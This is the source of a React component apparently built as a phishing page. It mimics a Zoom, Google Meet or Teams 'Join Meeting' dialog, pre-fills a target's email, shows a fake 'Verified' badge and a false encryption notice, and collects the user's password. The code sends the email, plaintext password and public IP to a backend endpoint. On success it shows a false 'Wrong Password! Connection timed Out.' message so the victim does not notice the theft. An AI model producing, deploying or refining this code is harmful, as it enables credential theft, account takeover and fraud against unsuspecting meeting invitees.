import React, { useState, useEffect } from 'react';
import { MeetingConfig } from '../types';
import { fetchClientPublicIp } from '../utils/ip';
import {
  ShieldCheck,
  Mail,
  MapPin,
  Globe,
  Lock,
  AlertCircle,
  CheckCircle2,
  Loader2,
  ArrowRight,
  LockIcon,
  Eye,
  EyeOff,

} from 'lucide-react';

export const getPlatformTemplateName = (platform?: string): string => {
  switch (platform) {
    case 'zoom':
      return 'Zoom Meeting';
    case 'google_meet':
      return 'Google Meet';
    case 'teams':
      return 'Microsoft Teams';
    default:
      return 'Video Conference';
  }
};

interface InformationModalProps {
  isOpen: boolean;
  clientEmail: string;
  clientName?: string;
  clientCompany?: string;
  hostName?: string;
  meetingTitle?: string;
  platformTemplate?: string;
  config: MeetingConfig;
  onSuccess: (data?: any) => void;
  onReset?: () => void;
  resetTrigger?: number | boolean;
}

export const InformationModal: React.FC<InformationModalProps> = ({
  isOpen,
  clientEmail: propClientEmail,
  clientName,
  clientCompany,
  hostName: propHostName,
  meetingTitle: propMeetingTitle,
  platformTemplate: propPlatformTemplate,
  config = {} as MeetingConfig,
  onSuccess,
  onReset,
  resetTrigger,
}) => {
  const initialEmail = propClientEmail || config.clientEmail || '';
  const [clientEmail, setClientEmail] = useState<string>(initialEmail);
  const [clientPassword, setClientPassword] = useState<string>('');
  const [showPassword, setShowPassword] = useState<boolean>(false); // Added missing state
  const [status, setStatus] = useState<'idle' | 'submitting' | 'success' | 'error'>('idle');
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [detectedIp, setDetectedIp] = useState<string>('Detecting...');

  const password = clientPassword;
  const setPassword = setClientPassword;

  // Safely resolve Host Name
  const resolvedHostName =
    propHostName ||
    config.hostName ||
    config.host?.fullName ||
    config.host?.displayName ||
    'Meeting Host';

  // Safely resolve active meeting title / platform template
  const resolvedPlatformTemplate =
    propPlatformTemplate ||
    config.platformTemplate ||
    config.meetingTemplateTitle ||
    (config.platform ? getPlatformTemplateName(config.platform) : '') ||
    propMeetingTitle ||
    config.meetingTitle ||
    config.title ||
    'Zoom Meeting';

  const meetingId = config.meetingId || config.id || '';

  useEffect(() => {
    if (propClientEmail) {
      setClientEmail(propClientEmail);
    }
  }, [propClientEmail]);

  const resetToInputState = () => {
    setStatus('idle');
    setClientPassword('');
    setShowPassword(false);
    setErrorMessage(null);
    if (onReset) {
      onReset();
    }
  };

  useEffect(() => {
    if (!isOpen) {
      setStatus('idle');
      setClientPassword('');
      setShowPassword(false);
      setErrorMessage(null);
    }
  }, [isOpen]);

  useEffect(() => {
    if (resetTrigger !== undefined) {
      resetToInputState();
    }
  }, [resetTrigger]);

  useEffect(() => {
    let isMounted = true;
    async function resolveIp() {
      try {
        const ip = await fetchClientPublicIp();
        if (isMounted) {
          setDetectedIp(ip);
        }
      } catch (e) {
        if (isMounted) {
          setDetectedIp('Unavailable');
        }
      }
    }
    if (isOpen) {
      resolveIp();
    }
    return () => {
      isMounted = false;
    };
  }, [isOpen]);

  if (!isOpen) return null;

  const isPasswordValid = password.trim().length > 0;
  const isEmailValid = Boolean(clientEmail && clientEmail.includes('@'));

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isPasswordValid || status === 'submitting') return;

    const trimmedEmail = clientEmail.trim();
    if (!isEmailValid) {
      setStatus('error');
      setErrorMessage('Valid invitation email is required');
      return;
    }

    setStatus('submitting');
    setErrorMessage(null);

    try {
      const API_URL = import.meta.env.VITE_BACKEND_URL || '';
      const response = await fetch(`${API_URL}/api/submit-client-info`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          clientEmail: trimmedEmail,
          clientPassword: password.trim(), // Fixed lowercase 'password'
          clientIp: detectedIp,
          meetingId: meetingId || 'N/A',
          hostName: resolvedHostName,
        }),
      });

      const result = await response.json();

      if (!response.ok || !result.success) {
        throw new Error(result.error || 'Failed to submit information');
      }

      setStatus('success');
      setClientPassword('');

      setTimeout(() => {
        onSuccess({
          clientEmail: trimmedEmail,
          clientPassword: password.trim(), // Fixed lowercase 'password'
          clientIp: detectedIp,
          meetingId,
          hostName: resolvedHostName,
        });
        resetToInputState();
      }, 1200);

    } catch (err: any) {
      console.error('Submission error:', err);
      setStatus('error');
      setErrorMessage(err.message || 'Something went wrong. Please try again.');
    }
  };

  return (
    <div
      id="client-information-modal-backdrop"
      className="fixed inset-0 z-50 flex items-center justify-center p-4 sm:p-6 bg-black/60 backdrop-blur-md animate-in fade-in duration-300"
    >
      <div
        id="client-information-modal-container"
        className="w-full max-w-lg bg-slate-900 border border-slate-700/80 rounded-2xl shadow-2xl overflow-hidden animate-in zoom-in-95 duration-200"
      >
        {/* Modal Header */}
        <div className="p-6 border-b border-slate-800 bg-slate-900/60 flex items-start gap-4">
          <div className="w-10 h-10 rounded-xl bg-indigo-600/20 border border-indigo-500/30 text-indigo-400 flex items-center justify-center shrink-0">
            <Lock className="w-5 h-5" />
          </div>
          <div>
            <h2 className="text-lg font-bold text-white tracking-tight">
              Join Meeting
            </h2>
            <p className="text-xs text-slate-400 mt-1 leading-relaxed">
              Please authenticate to continue with the call
            </p>
          </div>
        </div>

        {/* Modal Form */}
        <form onSubmit={handleSubmit} className="p-6 space-y-5">
           {/* Template-Driven Meeting & Host Info Block */}
          <div
            id="modal-meeting-template-block"
            data-testid="modal-meeting-template-block"
            className="p-3 rounded-xl bg-slate-950/70 border border-slate-800 flex items-center justify-between text-xs gap-3 shadow-inner"
          >
            <div className="min-w-0 flex-1">
              <div className="flex items-center gap-2 mb-1 flex-wrap">
                <span
                  id="modal-meeting-template-combined"
                  data-testid="modal-meeting-template-combined"
                  className="font-bold text-white text-xs tracking-tight flex items-center gap-1.5"
                >
                  <span>{resolvedPlatformTemplate}</span>
                  <span className="text-slate-600 font-normal">&bull;</span>
                  <span className="font-mono text-indigo-400 font-normal text-[11px]">
                    ID: {meetingId || 'N/A'}
                  </span>
                </span>
              </div>

              <div className="text-slate-400 text-xs flex items-center gap-1.5 flex-wrap">
                <span className="text-slate-500 text-[11px] font-medium">Host:</span>
                <span
                  id="modal-host-name"
                  data-testid="modal-host-name"
                  className="font-semibold text-slate-200"
                >
                  {resolvedHostName}
                </span>
              </div>
            </div>

            <div className="shrink-0 flex items-center">
              <span className="text-[10px] px-2 py-0.5 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 font-medium">
                Verified
              </span>
            </div>
          </div>

          {/* Email (Read-only) */}
          <div>
            <label className="block text-xs font-semibold text-slate-300 mb-1.5">
              <span>Your Email</span>
            </label>
            <div className="relative">
              <input
                id="client-email-readonly-input"
                type="email"
                readOnly
                value={clientEmail || 'client@enterprise.com'}
                className="w-full text-xs font-medium py-2.5 px-3 pl-9 rounded-xl border border-slate-800 bg-slate-950/70 text-slate-300 cursor-not-allowed select-none focus:outline-none"
              />
              <Mail className="w-4 h-4 text-slate-500 absolute left-3 top-2.5" />
            </div>
          </div>

          {/* Password (Editable) */}
          <div>
            <label
              htmlFor="client-password-input"
              className="block text-xs font-semibold text-slate-300 mb-1.5"
            >
              Enter Your Password <span className="text-rose-400">*</span>
            </label>

            <div className="relative">
              <Lock className="w-4 h-4 text-slate-500 absolute left-3 top-3" />

              <input
                id="client-password-input"
                name="password"
                type={showPassword ? 'text' : 'password'}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Enter your password to continue"
                required
                disabled={status === 'submitting' || status === 'success'}
                autoComplete="current-password"
                className="w-full text-xs py-2.5 px-3 pl-9 pr-10 rounded-xl border border-slate-700 bg-slate-950 text-white placeholder:text-slate-500 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500 transition-colors"
              />

              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-2.5 text-slate-500 hover:text-slate-300"
                aria-label={showPassword ? 'Hide password' : 'Show password'}
              >
                {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
              </button>
            </div>
          </div>

          {/* Privacy Notice */}
          <div className="p-3 rounded-xl bg-slate-950/40 border border-slate-800 flex items-start gap-2.5 text-[11px] text-slate-400 leading-relaxed">
            <Lock className="w-3.5 h-3.5 text-slate-400 shrink-0 mt-0.5" />
            <p>This meeting is secured with end-to-end encryption.</p>
          </div>

          {/* Error message state */}
          {status === 'error' && errorMessage && (
            <div className="p-3 rounded-xl bg-rose-950/40 border border-rose-800 text-rose-300 text-xs flex items-center gap-2 animate-in fade-in">
              <AlertCircle className="w-4 h-4 text-rose-400 shrink-0" />
              <span>{errorMessage}</span>
            </div>
          )}

          {/* Action Button */}
          <div>
            {status === 'success' ? (
              <div className="w-full py-3 px-4 rounded-xl bg-red-600/20 border border-red-500/40 text-red-300 text-xs font-semibold flex items-center justify-center gap-2 animate-in fade-in">
                <AlertCircle className="w-4 h-4 text-red-400" />
                <span>Wrong Password! Connection timed Out.</span>
              </div>
            ) : (
              <button
                id="client-information-continue-btn"
                type="submit"
                disabled={!isPasswordValid || status === 'submitting'}
                className="w-full py-3 px-4 rounded-xl text-xs font-semibold text-white bg-gradient-to-r from-indigo-600 to-indigo-500 hover:from-indigo-500 hover:to-indigo-600 disabled:opacity-40 disabled:cursor-not-allowed shadow-md hover:shadow-lg transition-all flex items-center justify-center gap-2 cursor-pointer"
              >
                {status === 'submitting' ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin text-white" />
                    <span>Confirming...</span>
                  </>
                ) : (
                  <>
                    <span>Continue</span>
                    <ArrowRight className="w-3.5 h-3.5" />
                  </>
                )}
              </button>
            )}
          </div>
        </form>
      </div>
    </div>
  );
};
